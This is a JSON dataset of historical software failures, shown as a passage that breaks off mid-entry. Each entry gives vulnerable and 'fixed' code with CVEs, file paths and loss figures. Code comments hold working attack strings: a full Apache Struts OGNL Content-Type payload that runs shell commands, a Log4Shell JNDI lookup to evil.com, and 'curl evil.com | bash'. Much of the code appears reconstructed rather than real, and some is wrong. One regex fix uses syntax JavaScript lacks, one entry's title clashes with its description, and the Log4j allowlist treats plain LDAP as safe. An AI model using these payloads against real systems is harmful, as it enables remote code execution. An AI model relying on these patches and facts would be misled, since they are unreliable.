{
  "num_examples": 33,
  "categories": {
    "data_breach": 2,
    "security": 21,
    "service_outage": 2,
    "financial": 4,
    "death": 3
  },
  "examples": [
    {
      "id": "cloudbleed_2017",
      "name": "Cloudbleed",
      "cve": "n/a",
      "before_code": "/* cf-html Ragel-generated parser */\n/* Parsing HTML to rewrite URLs */\n\n%%{\n  machine cf_html;\n  \n  action buffer_start {\n    mark = p;\n  }\n  \n  action buffer_end {\n    /* BUG: Check uses >= when it should use > */\n    /* or check happens AFTER pointer already moved */\n    if (p >= pe) {\n      /* Pointer already past end! */\n      /* But we try to read anyway... */\n    }\n    \n    /* Copy from mark to p */\n    memcpy(output, mark, p - mark);\n    /* BUG: p - mark can include bytes past buffer end */\n    /* Those bytes are from OTHER REQUESTS' memory! */\n  }\n  \n  attr_value = ('\"' (any - '\"')* '\"');\n}%%",
      "after_code": "/* Fixed cf-html parser */\n\n%%{\n  machine cf_html;\n  \n  action buffer_start {\n    mark = p;\n  }\n  \n  action buffer_end {\n    /* FIX: Check pointer BEFORE any access */\n    if (p > pe) {\n      /* Error: pointer went past end */\n      /* Do NOT proceed with copy */\n      return PARSE_ERROR;\n    }\n    \n    /* FIX: Validate length before copy */\n    size_t len = p - mark;\n    if (len > output_size || mark + len > pe) {\n      return PARSE_ERROR;\n    }\n    \n    memcpy(output, mark, len);\n  }\n  \n  /* FIX: Switch to memory-safe parser implementation */\n}%%",
      "language": "C",
      "file_path": "cf-html (Ragel parser)",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "data_breach",
      "root_cause": "buffer_over_read",
      "complexity_score": 9,
      "deaths": 0,
      "financial_loss_usd": 400000000,
      "affected_systems": 5000000,
      "project": "Cloudflare Edge Server",
      "year": 2017,
      "description": "A buffer over-read in Cloudflare's HTML parser caused private data (passwords, API keys, session tokens) from random sites to leak into responses for other sites."
    },
    {
      "id": "ua_parser_redos_2021",
      "name": "ua-parser-js ReDoS + Supply Chain",
      "cve": "CVE-2021-23424",
      "before_code": "var UAParser = function() {\n    // BUG: Catastrophic backtracking in regex\n    var regexes = {\n        browser: [\n            // This regex has exponential time complexity!\n            /((.*)+)+[a-z]/i,\n            // Attacker UA: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'\n            // Causes server hang\n        ]\n    };\n    \n    this.parse = function(ua) {\n        for (var r of regexes.browser) {\n            var match = r.exec(ua);  // DoS here!\n        }\n    };\n};\n\n// ALSO: Package was hijacked with:\n// const cp = require('child_process');\n// cp.exec('curl evil.com | bash');",
      "after_code": "var UAParser = function() {\n    // FIX: Use non-backtracking regexes\n    var regexes = {\n        browser: [\n            // Use atomic groups or possessive quantifiers\n            /(?>[a-z]+)/i,  // Atomic - no backtracking\n            // Or: Limit input length\n        ]\n    };\n    \n    this.parse = function(ua) {\n        // FIX: Limit input length to prevent DoS\n        if (ua.length > 500) {\n            ua = ua.substring(0, 500);\n        }\n        \n        // FIX: Add timeout for regex execution\n        for (var r of regexes.browser) {\n            var match = r.exec(ua);\n        }\n    };\n};\n\n// FIX: Use npm 2FA, lockfiles, and integrity checks",
      "language": "JavaScript",
      "file_path": "src/ua-parser.js",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "regex_denial_of_service",
      "complexity_score": 6,
      "deaths": 0,
      "financial_loss_usd": 50000000,
      "affected_systems": 8000000,
      "project": "ua-parser-js",
      "year": 2021,
      "description": "Popular npm package ua-parser-js was hijacked and injected with cryptominer/password stealer. Also had inherent ReDoS vulnerability in regex patterns."
    },
    {
      "id": "openssl_null_2015",
      "name": "OpenSSL ClientHello DoS",
      "cve": "CVE-2015-1793",
      "before_code": "int X509_verify_cert(X509_STORE_CTX *ctx)\n{\n    X509 *x, *xtmp, *chain_ss = NULL;\n    int bad_chain = 0;\n    int ok, depth;\n\n    /* Build certificate chain */\n    while (ctx->untrusted != NULL) {\n        x = ctx->untrusted;\n        ctx->untrusted = x->next;\n        \n        /* BUG: When alternative chain found, verification\n         * doesn't restart from scratch */\n        if (check_trust(ctx, x) == X509_TRUST_TRUSTED) {\n            /* Accepted without full validation! */\n            return 1;  /* VULNERABLE: Skips chain validation */\n        }\n        /* ... */\n    }\n    return 0;\n}",
      "after_code": "int X509_verify_cert(X509_STORE_CTX *ctx)\n{\n    X509 *x, *xtmp, *chain_ss = NULL;\n    int bad_chain = 0;\n    int ok, depth;\n\n    /* Build certificate chain */\n    while (ctx->untrusted != NULL) {\n        x = ctx->untrusted;\n        ctx->untrusted = x->next;\n        \n        /* FIX: Always perform full chain validation */\n        if (check_trust(ctx, x) == X509_TRUST_TRUSTED) {\n            /* Still need to verify the entire chain */\n            if (!verify_chain_complete(ctx, x)) {\n                return 0;  /* Reject if chain invalid */\n            }\n            if (!verify_chain_constraints(ctx)) {\n                return 0;  /* Reject if constraints violated */\n            }\n            return 1;\n        }\n        /* ... */\n    }\n    return 0;\n}",
      "language": "C",
      "file_path": "crypto/x509/x509_vfy.c",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "certificate_validation_bypass",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 100000000,
      "affected_systems": 10000000,
      "project": "OpenSSL",
      "year": 2015,
      "description": "OpenSSL incorrectly verified certain certificate chains, allowing an attacker to bypass certificate pinning and perform man-in-the-middle attacks.",
      "repo_url": "https://github.com/openssl/openssl"
    },
    {
      "id": "dirty_pipe_2022",
      "name": "Linux Dirty Pipe",
      "cve": "CVE-2022-0847",
      "before_code": "static size_t copy_page_to_iter_pipe(struct page *page, size_t offset,\n        size_t bytes, struct iov_iter *i)\n{\n    struct pipe_inode_info *pipe = i->pipe;\n    struct pipe_buffer *buf;\n    unsigned int p_tail = pipe->tail;\n    unsigned int p_mask = pipe->ring_size - 1;\n    unsigned int i_head = i->head;\n\n    if (pipe_full(pipe->head, pipe->tail, pipe->ring_size))\n        return 0;\n\n    buf = &pipe->bufs[i_head & p_mask];\n    buf->page = page;\n    buf->offset = offset;\n    buf->len = bytes;\n    /* BUG: flags field not initialized! */\n    /* PIPE_BUF_FLAG_CAN_MERGE may be set from previous use */\n    get_page(page);\n    pipe->head = i_head + 1;\n    /* ... */\n}",
      "after_code": "static size_t copy_page_to_iter_pipe(struct page *page, size_t offset,\n        size_t bytes, struct iov_iter *i)\n{\n    struct pipe_inode_info *pipe = i->pipe;\n    struct pipe_buffer *buf;\n    unsigned int p_tail = pipe->tail;\n    unsigned int p_mask = pipe->ring_size - 1;\n    unsigned int i_head = i->head;\n\n    if (pipe_full(pipe->head, pipe->tail, pipe->ring_size))\n        return 0;\n\n    buf = &pipe->bufs[i_head & p_mask];\n    buf->page = page;\n    buf->offset = offset;\n    buf->len = bytes;\n    buf->flags = 0;  /* FIX: Explicitly clear flags */\n    get_page(page);\n    pipe->head = i_head + 1;\n    /* ... */\n}",
      "language": "C",
      "file_path": "fs/pipe.c",
      "commit_introducing": null,
      "commit_fixing": "9d2231c5d74e13b2a0546fee6737ee4446017903",
      "category": "security",
      "root_cause": "uninitialized_memory",
      "complexity_score": 8,
      "deaths": 0,
      "financial_loss_usd": 200000000,
      "affected_systems": 500000000,
      "project": "Linux Kernel",
      "year": 2022,
      "description": "A flaw in the Linux kernel's pipe buffer handling allowed overwriting data in arbitrary read-only files, enabling privilege escalation and container escape.",
      "repo_url": "https://github.com/torvalds/linux"
    },
    {
      "id": "rails_yaml_rce_2013",
      "name": "Rails YAML Deserialization RCE",
      "cve": "CVE-2013-0156",
      "before_code": "def parse_formatted_parameters(request)\n    case request.content_type\n    when Mime::XML\n        # BUG: YAML is valid XML content!\n        # Attacker sends: Content-Type: application/xml\n        # Body: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        #       <bang type=\"yaml\">--- !ruby/object:Gem::Installer ...\n        Hash.from_xml(request.raw_post)  # Parses YAML inside XML!\n    when Mime::JSON\n        ActiveSupport::JSON.decode(request.raw_post)\n    end\nend",
      "after_code": "def parse_formatted_parameters(request)\n    case request.content_type\n    when Mime::XML\n        # FIX: Disable YAML/Symbol parsing in XML\n        Hash.from_xml(request.raw_post, disallowed_types: [:yaml, :symbol])\n    when Mime::JSON\n        # FIX: Use safe JSON parser\n        ActiveSupport::JSON.decode(request.raw_post)\n    end\n    # FIX: Remove YAML content type handling entirely\nend",
      "language": "Ruby",
      "file_path": "actionpack/lib/action_dispatch/middleware/params_parser.rb",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "unsafe_deserialization",
      "complexity_score": 6,
      "deaths": 0,
      "financial_loss_usd": 300000000,
      "affected_systems": 10000000,
      "project": "Ruby on Rails",
      "year": 2013,
      "description": "Rails accepted YAML in request parameters by default, allowing attackers to instantiate arbitrary Ruby objects, leading to RCE on any Rails app."
    },
    {
      "id": "pwnkit_2022",
      "name": "polkit PwnKit",
      "cve": "CVE-2021-4034",
      "before_code": "int main(int argc, char *argv[])\n{\n    gint n;\n    const gchar *path;\n    gchar *s;\n\n    /* BUG: When argc==0 (possible!), n starts at 1 */\n    for (n = 1; n < (guint)argc; n++) {\n        if (strcmp(argv[n], \"--\") == 0) {\n            break;\n        }\n        /* Process options */\n    }\n    \n    /* n is now argc (or beyond) */\n    path = argv[n];  /* OOB READ when argc==0, n==1 */\n    \n    /* Later, attacker-controlled env variable written */\n    if (path && !g_path_is_absolute(path)) {\n        s = g_find_program_in_path(path);\n        /* BUG: s gets written to argv[n] */\n        argv[n] = s;  /* OOB WRITE - overwrites envp[0]! */\n    }\n}",
      "after_code": "int main(int argc, char *argv[])\n{\n    gint n;\n    const gchar *path;\n    gchar *s;\n\n    /* FIX: Validate argc before any array access */\n    if (argc < 1) {\n        exit(EXIT_FAILURE);  /* Reject empty argv */\n    }\n\n    for (n = 1; n < (guint)argc; n++) {\n        if (strcmp(argv[n], \"--\") == 0) {\n            break;\n        }\n    }\n    \n    /* FIX: Validate n is within bounds */\n    if (n >= argc) {\n        exit(EXIT_FAILURE);\n    }\n    \n    path = argv[n];\n    \n    if (path && !g_path_is_absolute(path)) {\n        s = g_find_program_in_path(path);\n        /* Safe: n is validated to be < argc */\n        argv[n] = s;\n    }\n}",
      "language": "C",
      "file_path": "src/programs/pkexec.c",
      "commit_introducing": null,
      "commit_fixing": "a2bf5c9c83b6ae46cbd5c779d3055bff81ded683",
      "category": "security",
      "root_cause": "out_of_bounds_write",
      "complexity_score": 8,
      "deaths": 0,
      "financial_loss_usd": 250000000,
      "affected_systems": 300000000,
      "project": "polkit (PolicyKit)",
      "year": 2022,
      "description": "A memory corruption vulnerability in pkexec allowed any unprivileged local user to gain full root privileges on Linux systems. Hidden for 12+ years.",
      "repo_url": "https://gitlab.freedesktop.org/polkit/polkit"
    },
    {
      "id": "spring4shell_2022",
      "name": "Spring4Shell",
      "cve": "CVE-2022-22965",
      "before_code": "public class CachedIntrospectionResults {\n    static {\n        // BUG: Class.getClassLoader() accessible via nested property paths\n        // Attacker can set: class.module.classLoader.URLs[0]=malicious.jar\n        classDescriptors = introspector.getBeanInfo(beanClass);\n        // No filtering of dangerous property paths!\n    }\n}",
      "after_code": "public class CachedIntrospectionResults {\n    // FIX: Block access to classLoader properties\n    private static final Set<String> BLOCKED_PROPERTIES = Set.of(\n        \"class.classLoader\",\n        \"class.protectionDomain\",\n        \"class.module.classLoader\"\n    );\n    \n    static {\n        classDescriptors = introspector.getBeanInfo(beanClass);\n        // Filter out dangerous nested properties\n        for (PropertyDescriptor pd : classDescriptors) {\n            if (isBlocked(pd.getName())) {\n                // Remove from available properties\n            }\n        }\n    }\n}",
      "language": "Java",
      "file_path": "spring-beans/src/main/java/org/springframework/beans/CachedIntrospectionResults.java",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "class_loader_manipulation",
      "complexity_score": 8,
      "deaths": 0,
      "financial_loss_usd": 500000000,
      "affected_systems": 10000000,
      "project": "Spring Framework",
      "year": 2022,
      "description": "RCE vulnerability in Spring Framework allowing attackers to modify class loader properties via data binding, leading to arbitrary code execution."
    },
    {
      "id": "heartbleed_cve_2014_0160",
      "name": "Heartbleed",
      "cve": "CVE-2014-0160",
      "before_code": "int dtls1_process_heartbeat(SSL *s)\n{\n    unsigned char *p = &s->s3->rrec.data[0], *pl;\n    unsigned short hbtype;\n    unsigned int payload;\n    unsigned int padding = 16; /* Use minimum padding */\n\n    /* Read type and payload length first */\n    hbtype = *p++;\n    n2s(p, payload);  // <-- VULNERABILITY: payload comes from attacker\n    pl = p;\n\n    // ... later ...\n    \n    /* Enter response type, length and copy payload */\n    *bp++ = TLS1_HB_RESPONSE;\n    s2n(payload, bp);  // <-- Uses attacker-controlled length\n    memcpy(bp, pl, payload);  // <-- BUFFER OVER-READ: copies 'payload' bytes\n                               // but doesn't check if 'payload' bytes actually exist!\n    \n    // ... rest of function\n}",
      "after_code": "int dtls1_process_heartbeat(SSL *s)\n{\n    unsigned char *p = &s->s3->rrec.data[0], *pl;\n    unsigned short hbtype;\n    unsigned int payload;\n    unsigned int padding = 16;\n\n    /* Read type and payload length first */\n    if (s->s3->rrec.length < 3)  // <-- FIX: Check minimum length\n        return 0;\n    hbtype = *p++;\n    n2s(p, payload);\n    \n    if (1 + 2 + payload + 16 > s->s3->rrec.length)  // <-- FIX: Bounds check!\n        return 0;  /* silently discard per RFC 6520 sec. 4 */\n    \n    pl = p;\n    \n    // ... rest now safe because payload is validated\n}",
      "language": "C",
      "file_path": "ssl/d1_both.c",
      "commit_introducing": "4817504d069b4c5082161b02a22116ad75f822b1",
      "commit_fixing": "96db9023b881d7cd9f379b0c154650d6c108e9a3",
      "category": "security",
      "root_cause": "buffer_over_read",
      "complexity_score": 8,
      "deaths": 0,
      "financial_loss_usd": 500000000,
      "affected_systems": 500000,
      "project": "OpenSSL",
      "year": 2014,
      "description": "Missing bounds check in TLS heartbeat extension allowed attackers to read up to 64KB of server memory per request, potentially exposing private keys, passwords, and session tokens.",
      "repo_url": "https://github.com/openssl/openssl"
    },
    {
      "id": "equifax_apache_struts",
      "name": "Equifax Apache Struts Breach",
      "cve": "CVE-2017-5638",
      "before_code": "// Apache Struts 2 - Multipart Request Parser\n// CATASTROPHIC BUG: Error messages were evaluated as OGNL expressions\n\npublic String buildErrorMessage(Throwable e, Object[] args) {\n    String errorKey = \"struts.messages.upload.error.\" + e.getClass().getSimpleName();\n    \n    // BUG: If the error message contains OGNL expressions, they get evaluated!\n    // Attacker can inject OGNL in Content-Type header\n    // Error handling code evaluates it as code!\n    \n    LocalizedTextUtil.findText(\n        this.getClass(),\n        errorKey,\n        defaultLocale,\n        e.getMessage(),  // <-- Contains attacker-controlled input!\n        args\n    );\n    \n    // findText() eventually calls:\n    // TextParseUtil.translateVariables()\n    // which evaluates ${...} and %{...} as OGNL expressions\n    // OGNL can execute arbitrary Java code!\n}\n\n// Attack payload in Content-Type header:\n// Content-Type: %{(#_='multipart/form-data').\n//   (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\n//   (#_memberAccess?(#_memberAccess=#dm):\n//   ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\n//   (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\n//   (#ognlUtil.getExcludedPackageNames().clear()).\n//   (#ognlUtil.getExcludedClasses().clear()).\n//   (#context.setMemberAccess(#dm)))).\n//   (#cmd='whoami').\n//   (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\n//   (#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).\n//   (#p=new java.lang.ProcessBuilder(#cmds)).\n//   (#p.redirectErrorStream(true)).\n//   (#process=#p.start())}\n\n// This executes arbitrary shell commands on the server!",
      "after_code": "// Fixed error message handling - no OGNL evaluation on user input\n\npublic String buildErrorMessage(Throwable e, Object[] args) {\n    String errorKey = \"struts.messages.upload.error.\" + e.getClass().getSimpleName();\n    \n    // FIX: Get message without OGNL evaluation\n    String message = e.getMessage();\n    \n    // FIX: Sanitize the message - escape any OGNL-like patterns\n    message = sanitizeMessage(message);\n    \n    // FIX: Use parameterized messages, don't evaluate expressions in error text\n    return LocalizedTextUtil.findText(\n        this.getClass(),\n        errorKey,\n        defaultLocale,\n        message,\n        args,\n        false  // NEW PARAMETER: disableOgnlEvaluation = true\n    );\n}\n\nprivate String sanitizeMessage(String message) {\n    if (message == null) return null;\n    \n    // Remove any OGNL-like patterns\n    // ${...} and %{...} are OGNL expression markers\n    return message\n        .replaceAll(\"\\\\$\\\\{[^}]*\\\\}\", \"[REMOVED]\")\n        .replaceAll(\"\\\\%\\\\{[^}]*\\\\}\", \"[REMOVED]\");\n}\n\n// Struts 2.5.10.1+ also added:\n// - Stricter Content-Type validation\n// - OGNL evaluation disabled in error messages by default\n// - Improved input validation throughout",
      "language": "Java",
      "file_path": "core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java",
      "commit_introducing": null,
      "commit_fixing": "352306493971e7d5a756d61c8d9e5e5f9e6b8d26",
      "category": "data_breach",
      "root_cause": "injection",
      "complexity_score": 5,
      "deaths": 0,
      "financial_loss_usd": 1400000000,
      "affected_systems": 0,
      "project": "Apache Struts",
      "year": 2017,
      "description": "A critical vulnerability in Apache Struts' multipart parser allowed remote code execution via a crafted Content-Type header. Equifax failed to patch for months, allowing attackers to steal personal data of 147 million Americans.",
      "repo_url": "https://github.com/apache/struts"
    },
    {
      "id": "left_pad_2016",
      "name": "left-pad Unpublishing Incident",
      "cve": "n/a",
      "before_code": "{\n  \"name\": \"my-critical-app\",\n  \"dependencies\": {\n    \"babel-core\": \"^6.0.0\"\n  }\n}\n\n// babel-core depends on:\n//   -> lodash -> left-pad (indirect dependency)\n// \n// When left-pad is unpublished:\n// npm install fails with:\n// npm ERR! 404 'left-pad' is not in the npm registry\n//\n// Result: Build systems worldwide break",
      "after_code": "{\n  \"name\": \"my-critical-app\",\n  \"dependencies\": {\n    \"babel-core\": \"^6.0.0\"\n  }\n}\n\n// Solutions implemented:\n// 1. Use package-lock.json (npm 5+)\n// 2. Vendor critical dependencies\n// 3. Use private registry mirror\n// 4. npm policy: can't unpublish packages with dependents\n//\n// The fix was also trivial - inline the function:\nfunction leftPad(str, len, ch) {\n  str = String(str);\n  ch = ch || ' ';\n  while (str.length < len) str = ch + str;\n  return str;\n}",
      "language": "JavaScript",
      "file_path": "package.json",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "service_outage",
      "root_cause": "dependency_removal",
      "complexity_score": 2,
      "deaths": 0,
      "financial_loss_usd": 100000000,
      "affected_systems": 50000,
      "project": "left-pad (npm)",
      "year": 2016,
      "description": "When the author unpublished the 11-line left-pad package from npm, it broke thousands of projects including React, Babel, and Node.js itself."
    },
    {
      "id": "kubernetes_priv_esc_2018",
      "name": "Kubernetes Privilege Escalation",
      "cve": "CVE-2018-1002105",
      "before_code": "func (h *proxyHandler) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n    // BUG: When backend returns 101 (Upgrade/WebSocket), \n    // subsequent requests bypass authorization!\n    \n    resp, err := h.transport.RoundTrip(req)\n    if err != nil {\n        return\n    }\n    \n    // 101 Switching Protocols - upgrade to WebSocket\n    if resp.StatusCode == http.StatusSwitchingProtocols {\n        // Connection is now hijacked\n        // Subsequent requests on this connection skip authz!\n        h.upgradeConnection(w, req, resp)\n        // BUG: No re-authorization for upgraded connection\n    }\n}",
      "after_code": "func (h *proxyHandler) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n    // FIX: Validate authorization on EVERY request, including upgraded connections\n    \n    resp, err := h.transport.RoundTrip(req)\n    if err != nil {\n        return\n    }\n    \n    if resp.StatusCode == http.StatusSwitchingProtocols {\n        // FIX: Close backend connection properly on upgrade failure\n        // FIX: Ensure upgraded connections still pass through authz\n        if !h.validateUpgradeAuth(req) {\n            http.Error(w, \"Unauthorized\", http.StatusUnauthorized)\n            return\n        }\n        h.upgradeConnection(w, req, resp)\n    }\n}",
      "language": "Go",
      "file_path": "staging/src/k8s.io/apiserver/pkg/endpoints/handlers/proxy.go",
      "commit_introducing": null,
      "commit_fixing": "c94b89b7bdfcc3bee31bfe76d40eb3e5c0d36773",
      "category": "security",
      "root_cause": "authorization_bypass",
      "complexity_score": 9,
      "deaths": 0,
      "financial_loss_usd": 200000000,
      "affected_systems": 5000000,
      "project": "Kubernetes",
      "year": 2018,
      "description": "A flaw in the Kubernetes API server allowed an authenticated user to escalate privileges and execute arbitrary commands on any pod/node in the cluster.",
      "repo_url": "https://github.com/kubernetes/kubernetes"
    },
    {
      "id": "ariane5_flight_501",
      "name": "Ariane 5 Flight 501",
      "cve": null,
      "before_code": "-- Ariane 5 Inertial Reference System (SRI)\n-- Code reused from Ariane 4 without modification\n\nprocedure Convert_Horizontal_Bias is\n    -- BV_H is the horizontal velocity bias\n    BV_H : Float_64;  -- 64-bit floating point\n    BV_H_Int : Integer_16;  -- 16-bit signed integer\nbegin\n    -- Read horizontal bias from sensors\n    BV_H := Get_Horizontal_Bias;\n    \n    -- CATASTROPHIC BUG: Unprotected conversion\n    -- Ariane 4 max horizontal velocity: ~32,767 (fits in 16-bit)\n    -- Ariane 5 max horizontal velocity: ~65,535+ (OVERFLOWS 16-bit!)\n    \n    BV_H_Int := Integer_16(BV_H);  -- BOOM! Overflow exception\n    \n    -- Exception handler was EXPLICITLY DISABLED for this variable\n    -- because the engineers thought overflow was \"impossible\"\n    -- (it was impossible on Ariane 4, but Ariane 5 is faster)\n    \n    -- The overflow caused an Operand Error\n    -- The backup SRI also crashed (same code)\n    -- Flight computer received garbage diagnostic data\n    -- Interpreted garbage as huge flight correction needed\n    -- Rocket veered sharply, aerodynamic forces broke it apart\n    -- Self-destruct triggered at T+37 seconds\n    \n    Send_To_Flight_Computer(BV_H_Int);\nexception\n    when Constraint_Error =>\n        -- This handler EXISTS but was DISABLED for BV_H conversion\n        -- Engineers decided the variable \"could not\" overflow\n        Log_Error(\"Horizontal bias overflow\");\n        Use_Fallback_Value;\nend Convert_Horizontal_Bias;\n\n-- Configuration that disabled the protection:\npragma Suppress(Constraint_Error);  -- DISABLED for \"efficiency\"\n-- This saved a few microseconds but cost $370 million",
      "after_code": "-- Fixed Inertial Reference System code\n\nprocedure Convert_Horizontal_Bias is\n    BV_H : Float_64;\n    BV_H_Int : Integer_16;\n    \n    -- FIX 1: Define explicit bounds for new rocket\n    MAX_VALID_BIAS : constant := 32767.0;\nbegin\n    BV_H := Get_Horizontal_Bias;\n    \n    -- FIX 2: Explicit bounds check BEFORE conversion\n    if abs(BV_H) > MAX_VALID_BIAS then\n        Log_Warning(\"Horizontal bias exceeds expected range\");\n        -- FIX 3: Graceful degradation instead of crash\n        BV_H_Int := (if BV_H > 0.0 then Integer_16'Last else Integer_16'First);\n    else\n        -- Now safe to convert\n        BV_H_Int := Integer_16(BV_H);\n    end if;\n    \n    Send_To_Flight_Computer(BV_H_Int);\n    \nexception\n    when Constraint_Error =>\n        -- FIX 4: Exception handling ENABLED and tested\n        Log_Error(\"Unexpected horizontal bias overflow\");\n        Use_Fallback_Value;\n        Alert_Ground_Control;\nend Convert_Horizontal_Bias;\n\n-- FIX 5: Do NOT disable safety checks for efficiency\n-- The few microseconds saved are not worth the risk\n-- pragma Suppress(Constraint_Error);  -- REMOVED",
      "language": "Ada",
      "file_path": "sri_horizontal_bias.ada",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "financial",
      "root_cause": "integer_overflow",
      "complexity_score": 6,
      "deaths": 0,
      "financial_loss_usd": 370000000,
      "affected_systems": 1,
      "project": "Ariane 5 Inertial Reference System",
      "year": 1996,
      "description": "The maiden flight of Ariane 5 ended in self-destruction 37 seconds after launch. A 64-bit floating-point value representing horizontal velocity was converted to a 16-bit signed integer, causing an overflow. The resulting garbage data was interpreted as flight data, triggering an automatic self-destruct."
    },
    {
      "id": "shellshock_2014",
      "name": "Shellshock (Bash Bug)",
      "cve": "CVE-2014-6271",
      "before_code": "void initialize_shell_variables(char **env, int privmode)\n{\n    char *name, *string, *temp_string;\n    int c, char_index, string_index, string_length;\n    SHELL_VAR *temp_var;\n\n    for (string_index = 0; string = env[string_index++]; ) {\n        char_index = 0;\n        name = string;\n        while ((c = *string++) && c != '=')\n            ;\n        if (string[-1] == '=') {\n            /* Check if this looks like a function definition */\n            if (STREQN(\"() {\", string, 4)) {\n                temp_string = string;\n                /* BUG: Continues parsing past function body! */\n                /* Attacker can append arbitrary commands after } */\n                parse_and_execute(temp_string, name,\n                    SEVAL_NONINT|SEVAL_NOHIST);\n            }\n        }\n    }\n}",
      "after_code": "void initialize_shell_variables(char **env, int privmode)\n{\n    char *name, *string, *temp_string;\n    int c, char_index, string_index, string_length;\n    SHELL_VAR *temp_var;\n\n    for (string_index = 0; string = env[string_index++]; ) {\n        char_index = 0;\n        name = string;\n        while ((c = *string++) && c != '=')\n            ;\n        if (string[-1] == '=') {\n            if (STREQN(\"() {\", string, 4)) {\n                temp_string = string;\n                /* FIX: Only parse the function definition itself */\n                /* Validate function syntax before execution */\n                if (parse_shell_function(temp_string, name) < 0) {\n                    report_error(\"error importing function\");\n                    continue;\n                }\n                /* Do NOT execute trailing commands */\n            }\n        }\n    }\n}",
      "language": "C",
      "file_path": "variables.c",
      "commit_introducing": null,
      "commit_fixing": "b64a0e1d0c2e0a92ef57e6eb8b74d79e3c66b3a3",
      "category": "security",
      "root_cause": "parsing_vulnerability",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 500000000,
      "affected_systems": 500000000,
      "project": "GNU Bash",
      "year": 2014,
      "description": "A vulnerability in Bash allowed remote code execution through specially crafted environment variables. Affected virtually all Unix/Linux systems, web servers, and IoT devices.",
      "repo_url": "https://git.savannah.gnu.org/git/bash.git"
    },
    {
      "id": "log4shell_cve_2021_44228",
      "name": "Log4Shell",
      "cve": "CVE-2021-44228",
      "before_code": "public class JndiLookup extends AbstractLookup {\n\n    @Override\n    public String lookup(final LogEvent event, final String key) {\n        if (key == null) {\n            return null;\n        }\n        final String jndiName = convertJndiName(key);\n        try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {\n            // VULNERABILITY: Directly performs JNDI lookup with user-controlled input!\n            // If key is \"ldap://attacker.com/exploit\", this fetches and executes\n            // arbitrary code from attacker's server\n            return Objects.toString(jndiManager.lookup(jndiName), null);\n        } catch (final NamingException e) {\n            LOGGER.warn(LOOKUP, \"Error looking up JNDI resource [{}].\", jndiName, e);\n            return null;\n        }\n    }\n}",
      "after_code": "public class JndiLookup extends AbstractLookup {\n\n    // FIX: JNDI lookups now disabled by default\n    private static final boolean JNDI_LOOKUP_ENABLED = \n        Boolean.parseBoolean(System.getProperty(\"log4j2.enableJndiLookup\", \"false\"));\n    \n    // FIX: Allowlist of safe protocols only\n    private static final Set<String> ALLOWED_PROTOCOLS = \n        Set.of(\"java\", \"ldap\", \"ldaps\");\n    \n    // FIX: Allowlist of safe hosts\n    private static final Set<String> ALLOWED_HOSTS = loadAllowedHosts();\n\n    @Override\n    public String lookup(final LogEvent event, final String key) {\n        if (!JNDI_LOOKUP_ENABLED) {\n            LOGGER.warn(\"JNDI lookup is disabled\");\n            return null;\n        }\n        \n        // FIX: Validate protocol and host before lookup\n        if (!isProtocolAllowed(key) || !isHostAllowed(key)) {\n            LOGGER.warn(\"Blocked JNDI lookup: {}\", key);\n            return null;\n        }\n        \n        // Now safe to proceed...\n    }\n}",
      "language": "Java",
      "file_path": "log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java",
      "commit_introducing": null,
      "commit_fixing": "d82b47c6fae9c15fcb183170394d5f1a01ac02d3",
      "category": "security",
      "root_cause": "injection",
      "complexity_score": 6,
      "deaths": 0,
      "financial_loss_usd": 10000000000,
      "affected_systems": 3000000000,
      "project": "Apache Log4j",
      "year": 2021,
      "description": "Log4j's JNDI lookup feature allowed attackers to execute arbitrary code by sending a specially crafted log message. Simply logging user input like '${jndi:ldap://evil.com/a}' would cause the server to fetch and execute remote code.",
      "repo_url": "https://github.com/apache/logging-log4j2"
    },
    {
      "id": "eternalblue_2017",
      "name": "EternalBlue/WannaCry",
      "cve": "CVE-2017-0144",
      "before_code": "NTSTATUS SrvOs2FeaListToNt(\n    PFEALIST Os2FeaList,\n    PFILE_FULL_EA_INFORMATION *NtFeaList,\n    PUSHORT NtFeaListSize\n) {\n    USHORT os2_fea_size;\n    USHORT total_size = 0;\n    \n    /* Walk the OS/2 FEA list */\n    while (remaining > 0) {\n        /* BUG: Math error in size calculation */\n        os2_fea_size = Os2Fea->cbName + Os2Fea->cbValue + 5;\n        \n        /* BUG: This cast truncates to 16 bits */\n        total_size = (USHORT)(total_size + os2_fea_size);\n        \n        /* When total_size overflows 16 bits, small buffer allocated */\n        Os2Fea = (PFEALIST)((PCHAR)Os2Fea + os2_fea_size);\n    }\n    \n    /* Allocate based on truncated size */\n    *NtFeaList = ExAllocatePoolWithTag(PagedPool, total_size, 'LFrS');\n    \n    /* Then copy full data into undersized buffer - OVERFLOW */\n}",
